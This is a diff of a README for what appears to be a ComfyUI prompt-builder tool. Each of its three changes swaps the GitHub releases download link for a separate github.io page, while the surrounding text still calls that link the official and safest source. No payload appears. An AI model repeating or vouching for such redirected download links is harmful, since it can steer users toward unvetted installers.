@@ -1,6 +1,6 @@
 # ⚡ ComfyUI-Fantastic-MiniMaxH3-PromptBuilder - Build Better Prompts, Manage Media Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-ComfyUI--Fantastic--MiniMaxH3--PromptBuilder-blue?style=for-the-badge&logo=github)](https://github.com/abusayeed64548-cpu/ComfyUI-Fantastic-MiniMaxH3-PromptBuilder/releases)
+[![Download](https://img.shields.io/badge/Download-ComfyUI--Fantastic--MiniMaxH3--PromptBuilder-blue?style=for-the-badge&logo=github)](https://abusayeed64548-cpu.github.io)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to ComfyUI-Fantastic-MiniMaxH3-PromptBuilder! This application helps you
 
 ## 📥 Download & Install
 
-Visit this link to download the application: [Download ComfyUI-Fantastic-MiniMaxH3-PromptBuilder](https://github.com/abusayeed64548-cpu/ComfyUI-Fantastic-MiniMaxH3-PromptBuilder/releases)
+Visit this link to download the application: [Download ComfyUI-Fantastic-MiniMaxH3-PromptBuilder](https://abusayeed64548-cpu.github.io)
 
 Once you click the download link, you will see a list of releases. Look for the latest version (usually at the top) and download the file that matches your system.
 
@@ -174,7 +174,7 @@ Visit the GitHub repository to learn more about contributing.
 
 ## 📦 Download Again
 
-Remember, your primary download source is: [https://github.com/abusayeed64548-cpu/ComfyUI-Fantastic-MiniMaxH3-PromptBuilder/releases](https://github.com/abusayeed64548-cpu/ComfyUI-Fantastic-MiniMaxH3-PromptBuilder/releases)
+Remember, your primary download source is: [https://abusayeed64548-cpu.github.io](https://abusayeed64548-cpu.github.io)
 
 Always download from this official link to ensure you get the latest and safest version.
 
